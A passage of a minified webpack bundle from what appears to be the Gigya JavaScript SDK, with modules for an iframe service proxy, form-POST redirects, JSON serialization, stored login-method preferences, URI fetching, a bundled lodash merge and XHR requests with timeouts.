          }, e.prototype.postToIFrame = function (e) {
            var t = this.registerMessage(e),
              i = "object" == typeof e ? JSON.stringify(e) : e;
            return this._iframe.contentWindow.postMessage(i, this._iframe.src), t;
          }, e.prototype.registerMessage = function (e, t) {
            var i = this;
            return void 0 === t && (t = this.timeout), new gigya.Promise(function (n, o) {
              var r = i._win.setTimeout(function () {
                o("proxy request timeout");
              }, t);
              i._pendingReqs[e.id] = function (e) {
                i._win.clearTimeout(r), "error" === e.signal ? o(e.res) : n(e.res);
              };
            });
          }, e.prototype.sendRequest = function (e, t) {
            return this.postToIFrame({
              id: this._idCreator(),
              methodName: e,
              params: t
            });
          }, e.prototype.stop = function (e) {
            return void 0 === e && (e = !1), n.__awaiter(this, void 0, void 0, function () {
              var t, i;
              return n.__generator(this, function (n) {
                switch (n.label) {
                  case 0:
                    if (this.isInit) return [3, 1];
                    throw "proxy is not active";
                  case 1:
                    t = void 0, n.label = 2;
                  case 2:
                    return n.trys.push([2, 4, 5, 6]), [4, this.postToIFrame({
                      id: this._idCreator(),
                      signal: "stop"
                    })];
                  case 3:
                    return [2, n.sent()];
                  case 4:
                    throw i = n.sent(), t = i, i;
                  case 5:
                    return t && !e || (this._mutationObservers && this._mutationObservers.length && this.stopObservingIFrameRemoval(), this._win.removeEventListener("message", this.onResponse, !0), this._iframeHost.removeChild(this._iframe), delete this._iframe), [7];
                  case 6:
                    return [2];
                }
              });
            });
          }, e.prototype.wrapWith = function (e) {
            var t;
            if ("function" == typeof e) t = o.getAllClassMethodsNames(e);else if (e instanceof Array) t = e;else {
              if ("object" != typeof e) throw "unsupported type for wrapper";
              t = Object.keys(e);
            }
            return this.proxyFromKeys(t);
          }, e.prototype.proxyFromKeys = function (e) {
            var t = this,
              i = {};
            return e.forEach(function (e) {
              return i[e] = function () {
                for (var i = [], n = 0; n < arguments.length; n++) i[n] = arguments[n];
                return t.sendRequest(e, i);
              };
            }), i;
          }, e.prototype.startObservingIFrameRemoval = function () {
            for (var e = this._iframe; e.parentElement;) this.addMutationObserver(e), e = e.parentElement;
          }, e.prototype.stopObservingIFrameRemoval = function () {
            this._mutationObservers.forEach(function (e) {
              e && e.disconnect && e.disconnect();
            }), this._mutationObservers = [];
          }, e.prototype.addMutationObserver = function (e) {
            var t = this,
              i = new MutationObserver(function (i) {
                for (var n = 0, o = i; n < o.length; n++) {
                  var r = o[n];
                  if ("childList" == r.type && r.removedNodes.length) for (var a = 0; a < r.removedNodes.length; a++) {
                    if (r.removedNodes.item(a) === e) return window.gigya.logger.warn("### Gigya's service proxy has been unexpectedly detached from the DOM. This may cause unexpected behavior including a complete loss of service. ###"), void t.stopObservingIFrameRemoval();
                  }
                }
              });
            i.observe(e.parentElement, {
              childList: !0,
              subtree: !1
            }), this._mutationObservers.push(i);
          }, e.prototype._tryParseResponse = function (e) {
            try {
              return JSON.parse(e);
            } catch (t) {
              window.gigya.logger.warn("received message with invalid format", {
                data: e
              });
            }
          }, e;
        }();
      t.ServiceProxy = r;
    },
    49: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(4),
        o = i(13),
        r = i(6);
      t.redirect = function (e, t, i, a, s) {
        if (void 0 === s && (s = window.document), i && "post" == i.toLowerCase()) {
          var u = s.createElement("form"),
            c = [];
          u.setAttribute("accept-charset", "UTF-8"), u.setAttribute("method", "POST"), u.setAttribute("action", e), a && u.setAttribute("target", a);
          var l = n.merge(t);
          for (var g in l) "number" != typeof l[g] && "boolean" != typeof l[g] && "string" != typeof l[g] || "eventName" == g || c.push('<textarea name="' + encodeURIComponent(g) + '">' + l[g].toString().replace(/\&/g, "&amp;") + "</textarea>");
          u.innerHTML = c.join(""), u.style.display = "none", o.appendToBody(u, s), u.submit();
        } else {
          for (var d = new r.Uri(e), f = {}, p = 0; p < t.length; p++) {
            var h = t[p];
            for (var y in h) if (h.hasOwnProperty(y)) {
              var v = h[y];
              f[y] = v;
            }
          }
          d.addToSearch(f), s.location.href = d.toString();
        }
      };
    },
    5: function (module, exports) {
      function serialize(e, t, i, n, o) {
        if (void 0 === t && (t = !1), void 0 === i && (i = !1), void 0 === n && (n = 0), void 0 === o && (o = 20), window.gigya.localInfo.isIE8) {
          if (n || (n = 0), n > o) return "[Too deep]";
          var r = "",
            a = "",
            s = "";
          if (i) {
            s = "\t", a = "\n";
            for (var u = 0; u < n + 1; u++) r += s;
          }
          var c = typeof e;
          if ("function" == c) return c.toString();
          if ("object" != c || null === e) return "string" == c && (e = '"' + e.replace(/(\"|\\)/g, "\\$1").replace(/\r\n|\r|\n/g, "\\n") + '"'), String(e);
          var l,
            g,
            d = [],
            f = e && e.constructor == Array;
          if (f) for (u = 0; u < e.length; u++) c = typeof (g = e[u]), null == g || "undefined" == c ? g = "" : "string" == c ? g = '"' + g.replace(/(\"|\\)/g, "\\$1").replace(/\r\n|\r|\n/g, "\\n") + '"' : "function" == c ? g = t ? "Function" : "" : g.parentNode && g.innerHTML ? g = "HTMLElement" : g.constructor == Date ? g = "" : "object" == c && null !== g && (g = serialize(g, t, i, n + 1)), "" != String(g) && d.push(r + s + String(g));else for (l in e) c = typeof (g = e[l]), null == g || "undefined" == c ? g = String(g) : "string" == c ? g = '"' + g.replace(/(\"|\\)/g, "\\$1").replace(/\r\n|\r|\n/g, "\\n") + '"' : "function" == c ? g = t ? "Function" : "" : g.parentNode && g.innerHTML ? g = "HTMLElement" : g.constructor == Date ? g = "" : "object" == c && null !== g && (g = a + serialize(g, t, i, n + 1)), "" != String(g) && d.push(r + s + '"' + l.replace(/(\"|\\)/g, "\\$1").replace(/\r\n|\r|\n/g, "\\n") + '":' + String(g));
          return a + r + (f ? "[" : "{") + a + d.join("," + a) + a + r + (f ? "]" : "}");
        }
        return window.JSON.stringify(e);
      }
      function deserialize(json, defaultValue, scope) {
        if (!json || !json.replace(/^\s+|\s+$/g, "")) return defaultValue || {};
        try {
          var keys = [],
            values = [];
          if (scope) for (var key in scope) keys.push(key), values.push(scope[key]);
          var fn = eval("(function(" + keys.join(",") + ") { return " + json.trim() + "; })");
          return fn.apply(void 0, values);
        } catch (e) {
          return console.warn("Error deserializing JavaScript", e), defaultValue || {};
        }
      }
      function parse(e, t) {
        if (window.gigya.localInfo.isIE8) return deserialize(e, t);
        try {
          return window.JSON.parse(e);
        } catch (e) {
          return t || {};
        }
      }
      Object.defineProperty(exports, "__esModule", {
        value: !0
      }), exports.serialize = serialize, exports.deserialize = deserialize, exports.parse = parse;
    },
    50: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(0),
        o = i(14),
        r = i(4),
        a = i(60),
        s = function () {
          function e() {}
          return Object.defineProperty(e, "SITE_PREFERENCES_KEY", {
            get: function () {
              return window.gigya.apiKey + "_preferences";
            },
            enumerable: !0,
            configurable: !0
          }), Object.defineProperty(e, "SITE_GIG_KEY", {
            get: function () {
              return window.gigya.apiKey + "_gig";
            },
            enumerable: !0,
            configurable: !0
          }), Object.defineProperty(e.prototype, "didForcedBootstrap", {
            get: function () {
              return this.getDataByKey(e.SITE_GIG_KEY).didForcedBootstrap || null;
            },
            set: function (t) {
              this.setDataByKey(e.SITE_GIG_KEY, {
                didForcedBootstrap: t
              });
            },
            enumerable: !0,
            configurable: !0
          }), e.prototype.getPreferredLoginMethod = function (t) {
            var i, n, o, r;
            if (!t) return "";
            var a = this.getDataByKey(e.SITE_PREFERENCES_KEY);
            return null !== (r = null === (o = (null !== (n = null === (i = null == a ? void 0 : a.authentication) || void 0 === i ? void 0 : i.usersPreferredLoginMethods) && void 0 !== n ? n : []).find(function (e) {
              return e.identifier === t;
            })) || void 0 === o ? void 0 : o.preferredLoginMethod) && void 0 !== r ? r : "";
          }, e.prototype.setPreferredLoginMethod = function (t, i) {
            var o, r, a, s;
            if (i) {
              var u = this.getDataByKey(e.SITE_PREFERENCES_KEY),
                c = n.__spreadArrays(null !== (r = null === (o = null == u ? void 0 : u.authentication) || void 0 === o ? void 0 : o.usersPreferredLoginMethods) && void 0 !== r ? r : []),
                l = null !== (s = null === (a = null == u ? void 0 : u.authentication) || void 0 === a ? void 0 : a.tfaPreferredMethod) && void 0 !== s ? s : "",
                g = c.some(function (e) {
                  return e.identifier === i;
                });
              this.isMaxLimitUsersPreferredLoginMethodsReached(c) && !g && (c = this.removeOldestUserPreferredLoginMethod(c)), g || (c = this.addUserPreferredLoginMethod(c, {
                identifier: i,
                preferredLoginMethod: t
              })), g && (c = this.refreshExistingUserPreferredLoginMethod({
                authMethod: t,
                identifier: i,
                usersPreferredLoginMethods: c
              })), this.setDataByKey(e.SITE_PREFERENCES_KEY, {
                authentication: {
                  usersPreferredLoginMethods: c,
                  tfaPreferredMethod: l
                }
              });
            }
          }, e.prototype.setScreenVariant = function (t, i, n, o) {
            var r, a, s;
            this.setDataByKey(e.SITE_PREFERENCES_KEY, ((r = {})[t] = {
              screens: (a = {}, a[i] = (s = {}, s[n] = {
                variant: o
              }, s), a)
            }, r));
          }, e.prototype.getScreenVariant = function (t, i, n) {
            var o,
              r,
              a,
              s,
              u = this.getDataByKey(e.SITE_PREFERENCES_KEY);
            return null === (s = null === (a = null === (r = null === (o = null == u ? void 0 : u[t]) || void 0 === o ? void 0 : o.screens) || void 0 === r ? void 0 : r[i]) || void 0 === a ? void 0 : a[n]) || void 0 === s ? void 0 : s.variant;
          }, e.prototype.getDataByKey = function (e) {
            return o.getObject(e, {});
          }, e.prototype.setDataByKey = function (e, t) {
            var i = this.getDataByKey(e);
            try {
              o.setObject(e, r.removeUndefined(a(i, t)));
            } catch (t) {
              window.gigya.logger.report("Failed to save local site data", {
                error: t,
                key: e
              });
            }
          }, e.prototype.refreshExistingUserPreferredLoginMethod = function (e) {
            var t = e.usersPreferredLoginMethods,
              i = e.identifier,
              n = e.authMethod,
              o = this.removeUserPreferredLoginMethod(t, i);
            return this.addUserPreferredLoginMethod(o, {
              identifier: i,
              preferredLoginMethod: n
            });
          }, e.prototype.removeUserPreferredLoginMethod = function (e, t) {
            return e.filter(function (e) {
              return e.identifier !== t;
            });
          }, e.prototype.isMaxLimitUsersPreferredLoginMethodsReached = function (e) {
            return 10 === e.length;
          }, e.prototype.removeOldestUserPreferredLoginMethod = function (e) {
            var t = e[0];
            return this.removeUserPreferredLoginMethod(e, null == t ? void 0 : t.identifier);
          }, e.prototype.addUserPreferredLoginMethod = function (e, t) {
            return n.__spreadArrays(e, [t]);
          }, e;
        }();
      t.SiteDataService = s, t.siteData = new s();
    },
    51: function (e, t) {
      e.exports = function (e) {
        return e.webpackPolyfill || (e.deprecate = function () {}, e.paths = [], e.children || (e.children = []), Object.defineProperty(e, "loaded", {
          enumerable: !0,
          get: function () {
            return e.l;
          }
        }), Object.defineProperty(e, "id", {
          enumerable: !0,
          get: function () {
            return e.i;
          }
        }), e.webpackPolyfill = 1), e;
      };
    },
    6: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(0),
        o = i(19),
        r = function () {
          function e(e, t) {
            void 0 === t && (t = !0), this._anchor = document.createElement("a");
            var i = "http:" == document.location.protocol ? "http" : "https";
            t && -1 === e.indexOf("://") && "/" !== e.charAt(0) && (e = i + "://" + e), this._anchor.href = e;
          }
          return Object.defineProperty(e.prototype, "domain", {
            get: function () {
              return this._anchor.hostname;
            },
            enumerable: !0,
            configurable: !0
          }), Object.defineProperty(e.prototype, "path", {
            get: function () {
              return this._anchor.pathname;
            },
            enumerable: !0,
            configurable: !0
          }), Object.defineProperty(e.prototype, "href", {
            get: function () {
              return this._anchor.href;
            },
            enumerable: !0,
            configurable: !0
          }), Object.defineProperty(e.prototype, "search", {
            get: function () {
              return this._anchor.search.slice(1);
            },
            enumerable: !0,
            configurable: !0
          }), Object.defineProperty(e.prototype, "hash", {
            get: function () {
              return this._anchor.hash.slice(1);
            },
            enumerable: !0,
            configurable: !0
          }), e.prototype.toString = function () {
            return this._anchor.href;
          }, e.prototype.addToSearch = function (e) {
            for (var t in e) {
              var i = e[t];
              if (("boolean" == typeof i || "number" == typeof i || "string" == typeof i) && "eventName" != t) {
                var n = this._anchor.search ? "&" : "";
                this._anchor.search += "" + n + t + "=" + encodeURIComponent(e[t]);
              }
            }
            return this;
          }, e.prototype.fetch = function (e) {
            return void 0 === e && (e = 0), n.__awaiter(this, void 0, void 0, function () {
              var t, i;
              return n.__generator(this, function (n) {
                switch (n.label) {
                  case 0:
                    return n.trys.push([0, 5,, 8]), window.fetch ? [4, this.browserFetch()] : [3, 2];
                  case 1:
                    return t = n.sent(), [3, 4];
                  case 2:
                    return [4, this.xhr()];
                  case 3:
                    t = n.sent(), n.label = 4;
                  case 4:
                    return [2, t];
                  case 5:
                    if (i = n.sent(), e <= 0) throw new Error("fetch failed: " + i);
                    return [4, this.delay(1)];
                  case 6:
                    return n.sent(), [4, this.fetch(e - 1)];
                  case 7:
                    return [2, n.sent()];
                  case 8:
                    return [2];
                }
              });
            });
          }, e.prototype.isBaseOf = function (t) {
            return e.parse(t).isIn(this);
          }, e.prototype.isIn = function (t) {
            return "string" == typeof t && (t = e.parse(t)), (this.domain == t.domain || this.isSubDomainOf(t)) && (!t.path || 0 == this.path.indexOf(t.path));
          }, e.prototype.isForSubDomains = function () {
            return 0 == this.domain.indexOf(".");
          }, e.prototype.isSubDomainOf = function (e) {
            var t = "";
            return e.isForSubDomains() || (t = "."), t += e.domain, o.endsWith(this.domain, t);
          }, e.parse = function (t, i) {
            if (void 0 === i && (i = !0), t) return new e(t, i);
          }, e.prototype.browserFetch = function () {
            return n.__awaiter(this, void 0, void 0, function () {
              var e, t;
              return n.__generator(this, function (i) {
                switch (i.label) {
                  case 0:
                    return e = this.toString(), [4, window.fetch(e)];
                  case 1:
                    if (!(t = i.sent()).ok) throw new Error("fetch failed");
                    return [2, t.json()];
                }
              });
            });
          }, e.prototype.xhr = function () {
            var e = this.toString();
            return new gigya.Promise(function (t, i) {
              var n = new XMLHttpRequest();
              n.open("GET", e), n.send(), n.onerror = i, n.onload = function () {
                if (4 !== n.readyState || 200 !== n.status) return i("xhr failed - " + n.status + " - " + n.statusText);
                try {
                  var e = JSON.parse(n.responseText);
                  return t(e);
                } catch (e) {
                  return i(e);
                }
              };
            });
          }, e.prototype.delay = function (e) {
            return n.__awaiter(this, void 0, void 0, function () {
              return n.__generator(this, function (t) {
                return [2, new gigya.Promise(function (t) {
                  return setTimeout(t, e);
                })];
              });
            });
          }, e;
        }();
      t.Uri = r;
    },
    60: function (e, t, i) {
      (function (e, i) {
        var n = /^\[object .+?Constructor\]$/,
          o = /^(?:0|[1-9]\d*)$/,
          r = {};
        r["[object Float32Array]"] = r["[object Float64Array]"] = r["[object Int8Array]"] = r["[object Int16Array]"] = r["[object Int32Array]"] = r["[object Uint8Array]"] = r["[object Uint8ClampedArray]"] = r["[object Uint16Array]"] = r["[object Uint32Array]"] = !0, r["[object Arguments]"] = r["[object Array]"] = r["[object ArrayBuffer]"] = r["[object Boolean]"] = r["[object DataView]"] = r["[object Date]"] = r["[object Error]"] = r["[object Function]"] = r["[object Map]"] = r["[object Number]"] = r["[object Object]"] = r["[object RegExp]"] = r["[object Set]"] = r["[object String]"] = r["[object WeakMap]"] = !1;
        var a = "object" == typeof e && e && e.Object === Object && e,
          s = "object" == typeof self && self && self.Object === Object && self,
          u = a || s || Function("return this")(),
          c = t && !t.nodeType && t,
          l = c && "object" == typeof i && i && !i.nodeType && i,
          g = l && l.exports === c,
          d = g && a.process,
          f = function () {
            try {
              var e = l && l.require && l.require("util").types;
              return e || d && d.binding && d.binding("util");
            } catch (e) {}
          }(),
          p = f && f.isTypedArray;
        function h(e, t, i) {
          switch (i.length) {
            case 0:
              return e.call(t);
            case 1:
              return e.call(t, i[0]);
            case 2:
              return e.call(t, i[0], i[1]);
            case 3:
              return e.call(t, i[0], i[1], i[2]);
          }
          return e.apply(t, i);
        }
        var y,
          v,
          w,
          m = Array.prototype,
          _ = Function.prototype,
          b = Object.prototype,
          S = u["__core-js_shared__"],
          k = _.toString,
          I = b.hasOwnProperty,
          P = (y = /[^.]+$/.exec(S && S.keys && S.keys.IE_PROTO || "")) ? "Symbol(src)_1." + y : "",
          x = b.toString,
          O = k.call(Object),
          T = RegExp("^" + k.call(I).replace(/[\\^$.*+?()[\]{}|]/g, "\\$&").replace(/hasOwnProperty|(function).*?(?=\\\()| for .+?(?=\\\])/g, "$1.*?") + "$"),
          A = g ? u.Buffer : void 0,
          C = u.Symbol,
          E = u.Uint8Array,
          R = A ? A.allocUnsafe : void 0,
          D = (v = Object.getPrototypeOf, w = Object, function (e) {
            return v(w(e));
          }),
          L = Object.create,
          j = b.propertyIsEnumerable,
          M = m.splice,
          F = C ? C.toStringTag : void 0,
          G = function () {
            try {
              var e = ce(Object, "defineProperty");
              return e({}, "", {}), e;
            } catch (e) {}
          }(),
          N = A ? A.isBuffer : void 0,
          U = Math.max,
          K = Date.now,
          q = ce(u, "Map"),
          z = ce(Object, "create"),
          B = function () {
            function e() {}
            return function (t) {
              if (!be(t)) return {};
              if (L) return L(t);
              e.prototype = t;
              var i = new e();
              return e.prototype = void 0, i;
            };
          }();
        function V(e) {
          var t = -1,
            i = null == e ? 0 : e.length;
          for (this.clear(); ++t < i;) {
            var n = e[t];
            this.set(n[0], n[1]);
          }
        }
        function H(e) {
          var t = -1,
            i = null == e ? 0 : e.length;
          for (this.clear(); ++t < i;) {
            var n = e[t];
            this.set(n[0], n[1]);
          }
        }
        function W(e) {
          var t = -1,
            i = null == e ? 0 : e.length;
          for (this.clear(); ++t < i;) {
            var n = e[t];
            this.set(n[0], n[1]);
          }
        }
        function $(e) {
          var t = this.__data__ = new H(e);
          this.size = t.size;
        }
        function X(e, t) {
          var i = ye(e),
            n = !i && he(e),
            o = !i && !n && we(e),
            r = !i && !n && !o && ke(e),
            a = i || n || o || r,
            s = a ? function (e, t) {
              for (var i = -1, n = Array(e); ++i < e;) n[i] = t(i);
              return n;
            }(e.length, String) : [],
            u = s.length;
          for (var c in e) !t && !I.call(e, c) || a && ("length" == c || o && ("offset" == c || "parent" == c) || r && ("buffer" == c || "byteLength" == c || "byteOffset" == c) || le(c, u)) || s.push(c);
          return s;
        }
        function J(e, t, i) {
          (void 0 !== i && !pe(e[t], i) || void 0 === i && !(t in e)) && Z(e, t, i);
        }
        function Y(e, t, i) {
          var n = e[t];
          I.call(e, t) && pe(n, i) && (void 0 !== i || t in e) || Z(e, t, i);
        }
        function Q(e, t) {
          for (var i = e.length; i--;) if (pe(e[i][0], t)) return i;
          return -1;
        }
        function Z(e, t, i) {
          "__proto__" == t && G ? G(e, t, {
            configurable: !0,
            enumerable: !0,
            value: i,
            writable: !0
          }) : e[t] = i;
        }
        V.prototype.clear = function () {
          this.__data__ = z ? z(null) : {}, this.size = 0;
        }, V.prototype.delete = function (e) {
          var t = this.has(e) && delete this.__data__[e];
          return this.size -= t ? 1 : 0, t;
        }, V.prototype.get = function (e) {
          var t = this.__data__;
          if (z) {
            var i = t[e];
            return "__lodash_hash_undefined__" === i ? void 0 : i;
          }
          return I.call(t, e) ? t[e] : void 0;
        }, V.prototype.has = function (e) {
          var t = this.__data__;
          return z ? void 0 !== t[e] : I.call(t, e);
        }, V.prototype.set = function (e, t) {
          var i = this.__data__;
          return this.size += this.has(e) ? 0 : 1, i[e] = z && void 0 === t ? "__lodash_hash_undefined__" : t, this;
        }, H.prototype.clear = function () {
          this.__data__ = [], this.size = 0;
        }, H.prototype.delete = function (e) {
          var t = this.__data__,
            i = Q(t, e);
          return !(i < 0) && (i == t.length - 1 ? t.pop() : M.call(t, i, 1), --this.size, !0);
        }, H.prototype.get = function (e) {
          var t = this.__data__,
            i = Q(t, e);
          return i < 0 ? void 0 : t[i][1];
        }, H.prototype.has = function (e) {
          return Q(this.__data__, e) > -1;
        }, H.prototype.set = function (e, t) {
          var i = this.__data__,
            n = Q(i, e);
          return n < 0 ? (++this.size, i.push([e, t])) : i[n][1] = t, this;
        }, W.prototype.clear = function () {
          this.size = 0, this.__data__ = {
            hash: new V(),
            map: new (q || H)(),
            string: new V()
          };
        }, W.prototype.delete = function (e) {
          var t = ue(this, e).delete(e);
          return this.size -= t ? 1 : 0, t;
        }, W.prototype.get = function (e) {
          return ue(this, e).get(e);
        }, W.prototype.has = function (e) {
          return ue(this, e).has(e);
        }, W.prototype.set = function (e, t) {
          var i = ue(this, e),
            n = i.size;
          return i.set(e, t), this.size += i.size == n ? 0 : 1, this;
        }, $.prototype.clear = function () {
          this.__data__ = new H(), this.size = 0;
        }, $.prototype.delete = function (e) {
          var t = this.__data__,
            i = t.delete(e);
          return this.size = t.size, i;
        }, $.prototype.get = function (e) {
          return this.__data__.get(e);
        }, $.prototype.has = function (e) {
          return this.__data__.has(e);
        }, $.prototype.set = function (e, t) {
          var i = this.__data__;
          if (i instanceof H) {
            var n = i.__data__;
            if (!q || n.length < 199) return n.push([e, t]), this.size = ++i.size, this;
            i = this.__data__ = new W(n);
          }
          return i.set(e, t), this.size = i.size, this;
        };
        var ee,
          te = function (e, t, i) {
            for (var n = -1, o = Object(e), r = i(e), a = r.length; a--;) {
              var s = r[ee ? a : ++n];
              if (!1 === t(o[s], s, o)) break;
            }
            return e;
          };
        function ie(e) {
          return null == e ? void 0 === e ? "[object Undefined]" : "[object Null]" : F && F in Object(e) ? function (e) {
            var t = I.call(e, F),
              i = e[F];
            try {
              e[F] = void 0;
              var n = !0;
            } catch (e) {}
            var o = x.call(e);
            n && (t ? e[F] = i : delete e[F]);
            return o;
          }(e) : function (e) {
            return x.call(e);
          }(e);
        }
        function ne(e) {
          return Se(e) && "[object Arguments]" == ie(e);
        }
        function oe(e) {
          return !(!be(e) || function (e) {
            return !!P && P in e;
          }(e)) && (me(e) ? T : n).test(function (e) {
            if (null != e) {
              try {
                return k.call(e);
              } catch (e) {}
              try {
                return e + "";
              } catch (e) {}
            }
            return "";
          }(e));
        }
        function re(e) {
          if (!be(e)) return function (e) {
            var t = [];
            if (null != e) for (var i in Object(e)) t.push(i);
            return t;
          }(e);
          var t = ge(e),
            i = [];
          for (var n in e) ("constructor" != n || !t && I.call(e, n)) && i.push(n);
          return i;
        }
        function ae(e, t, i, n, o) {
          e !== t && te(t, function (r, a) {
            if (o || (o = new $()), be(r)) !function (e, t, i, n, o, r, a) {
              var s = de(e, i),
                u = de(t, i),
                c = a.get(u);
              if (c) return void J(e, i, c);
              var l = r ? r(s, u, i + "", e, t, a) : void 0,
                g = void 0 === l;
              if (g) {
                var d = ye(u),
                  f = !d && we(u),
                  p = !d && !f && ke(u);
                l = u, d || f || p ? ye(s) ? l = s : Se(m = s) && ve(m) ? l = function (e, t) {
                  var i = -1,
                    n = e.length;
                  t || (t = Array(n));
                  for (; ++i < n;) t[i] = e[i];
                  return t;
                }(s) : f ? (g = !1, l = function (e, t) {
                  if (t) return e.slice();
                  var i = e.length,
                    n = R ? R(i) : new e.constructor(i);
                  return e.copy(n), n;
                }(u, !0)) : p ? (g = !1, h = u, y = !0 ? (v = h.buffer, w = new v.constructor(v.byteLength), new E(w).set(new E(v)), w) : h.buffer, l = new h.constructor(y, h.byteOffset, h.length)) : l = [] : function (e) {
                  if (!Se(e) || "[object Object]" != ie(e)) return !1;
                  var t = D(e);
                  if (null === t) return !0;
                  var i = I.call(t, "constructor") && t.constructor;
                  return "function" == typeof i && i instanceof i && k.call(i) == O;
                }(u) || he(u) ? (l = s, he(s) ? l = function (e) {
                  return function (e, t, i, n) {
                    var o = !i;
                    i || (i = {});
                    var r = -1,
                      a = t.length;
                    for (; ++r < a;) {
                      var s = t[r],
                        u = n ? n(i[s], e[s], s, i, e) : void 0;
                      void 0 === u && (u = e[s]), o ? Z(i, s, u) : Y(i, s, u);
                    }
                    return i;
                  }(e, Ie(e));
                }(s) : be(s) && !me(s) || (l = function (e) {
                  return "function" != typeof e.constructor || ge(e) ? {} : B(D(e));
                }(u))) : g = !1;
              }
              var h, y, v, w;
              var m;
              g && (a.set(u, l), o(l, u, n, r, a), a.delete(u));
              J(e, i, l);
            }(e, t, a, i, ae, n, o);else {
              var s = n ? n(de(e, a), r, a + "", e, t, o) : void 0;
              void 0 === s && (s = r), J(e, a, s);
            }
          }, Ie);
        }
        function se(e, t) {
          return fe(function (e, t, i) {
            return t = U(void 0 === t ? e.length - 1 : t, 0), function () {
              for (var n = arguments, o = -1, r = U(n.length - t, 0), a = Array(r); ++o < r;) a[o] = n[t + o];
              o = -1;
              for (var s = Array(t + 1); ++o < t;) s[o] = n[o];
              return s[t] = i(a), h(e, this, s);
            };
          }(e, t, Oe), e + "");
        }
        function ue(e, t) {
          var i,
            n,
            o = e.__data__;
          return ("string" == (n = typeof (i = t)) || "number" == n || "symbol" == n || "boolean" == n ? "__proto__" !== i : null === i) ? o["string" == typeof t ? "string" : "hash"] : o.map;
        }
        function ce(e, t) {
          var i = function (e, t) {
            return null == e ? void 0 : e[t];
          }(e, t);
          return oe(i) ? i : void 0;
        }
        function le(e, t) {
          var i = typeof e;
          return !!(t = null == t ? 9007199254740991 : t) && ("number" == i || "symbol" != i && o.test(e)) && e > -1 && e % 1 == 0 && e < t;
        }
        function ge(e) {
          var t = e && e.constructor;
          return e === ("function" == typeof t && t.prototype || b);
        }
        function de(e, t) {
          if (("constructor" !== t || "function" != typeof e[t]) && "__proto__" != t) return e[t];
        }
        var fe = function (e) {
          var t = 0,
            i = 0;
          return function () {
            var n = K(),
              o = 16 - (n - i);
            if (i = n, o > 0) {
              if (++t >= 800) return arguments[0];
            } else t = 0;
            return e.apply(void 0, arguments);
          };
        }(G ? function (e, t) {
          return G(e, "toString", {
            configurable: !0,
            enumerable: !1,
            value: (i = t, function () {
              return i;
            }),
            writable: !0
          });
          var i;
        } : Oe);
        function pe(e, t) {
          return e === t || e != e && t != t;
        }
        var he = ne(function () {
            return arguments;
          }()) ? ne : function (e) {
            return Se(e) && I.call(e, "callee") && !j.call(e, "callee");
          },
          ye = Array.isArray;
        function ve(e) {
          return null != e && _e(e.length) && !me(e);
        }
        var we = N || function () {
          return !1;
        };
        function me(e) {
          if (!be(e)) return !1;
          var t = ie(e);
          return "[object Function]" == t || "[object GeneratorFunction]" == t || "[object AsyncFunction]" == t || "[object Proxy]" == t;
        }
        function _e(e) {
          return "number" == typeof e && e > -1 && e % 1 == 0 && e <= 9007199254740991;
        }
        function be(e) {
          var t = typeof e;
          return null != e && ("object" == t || "function" == t);
        }
        function Se(e) {
          return null != e && "object" == typeof e;
        }
        var ke = p ? function (e) {
          return function (t) {
            return e(t);
          };
        }(p) : function (e) {
          return Se(e) && _e(e.length) && !!r[ie(e)];
        };
        function Ie(e) {
          return ve(e) ? X(e, !0) : re(e);
        }
        var Pe,
          xe = (Pe = function (e, t, i) {
            ae(e, t, i);
          }, se(function (e, t) {
            var i = -1,
              n = t.length,
              o = n > 1 ? t[n - 1] : void 0,
              r = n > 2 ? t[2] : void 0;
            for (o = Pe.length > 3 && "function" == typeof o ? (n--, o) : void 0, r && function (e, t, i) {
              if (!be(i)) return !1;
              var n = typeof t;
              return !!("number" == n ? ve(i) && le(t, i.length) : "string" == n && t in i) && pe(i[t], e);
            }(t[0], t[1], r) && (o = n < 3 ? void 0 : o, n = 1), e = Object(e); ++i < n;) {
              var a = t[i];
              a && Pe(e, a, i, o);
            }
            return e;
          }));
        function Oe(e) {
          return e;
        }
        i.exports = xe;
      }).call(this, i(23), i(51)(e));
    },
    67: function (e, t) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      }), t.isSignalRequest = function (e) {
        return Boolean(e.signal);
      };
    },
    68: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(3),
        o = function () {
          function e(e, t, i) {
            void 0 === e && (e = window.gigya.partnerSettings.ssoKey), void 0 === t && (t = window.gigya.utils.localStorage.initializeAdapter(window.gigya.utils.localStorage.CookieStorageAdapter)), void 0 === i && (i = n.localInfo.pageDomain), this._ssoKey = e, this._storage = t, this._pageDomain = i, this._cookieName = "apiDomain_" + this._ssoKey;
          }
          return e.prototype.get = function () {
            return this._ssoKey ? this._storage.getItem(this._cookieName) : void 0;
          }, e.prototype.set = function (e) {
            this._ssoKey && (window.gigya.logger.info("setting as group api domain for " + this._ssoKey), this._storage.removeItem(this._cookieName), this._storage.setItem(this._cookieName, e, void 0, this._pageDomain));
          }, e;
        }();
      t.GroupApiDomainService = o;
    },
    69: function (e, t) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      }), function (e) {
        e.GET = "GET", e.POST = "POST";
      }(t.RequestType || (t.RequestType = {}));
    },
    77: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(0),
        o = function () {
          function e(e, t, i) {
            void 0 === e && (e = window.gigya.XhrRequest), void 0 === t && (t = 15e3), void 0 === i && (i = window), this._xhrRequest = e, this.timeout = t, this._win = i;
          }
          return e.prototype.send = function (e, t, i, o, r) {
            return void 0 === r && (r = {}), n.__awaiter(this, void 0, void 0, function () {
              var a = this;
              return n.__generator(this, function (s) {
                return [2, new gigya.Promise(function (s, u) {
                  return n.__awaiter(a, void 0, void 0, function () {
                    var a, c, l, g;
                    return n.__generator(this, function (n) {
                      switch (n.label) {
                        case 0:
                          a = new this._xhrRequest(e, t, i, o, r), c = this._win.setTimeout(function () {
                            u("API request timeout");
                          }, this.timeout), n.label = 1;
                        case 1:
                          return n.trys.push([1, 3, 4, 5]), l = s, [4, a.send()];
                        case 2:
                          return l.apply(void 0, [n.sent()]), [3, 5];
                        case 3:
                          return g = n.sent(), window.gigya.logger.report("XHR request failed", {
                            methodName: t,
                            params: i,
                            settings: o,
                            err: g
                          }), u("Request for " + t + " failed"), [3, 5];
                        case 4:
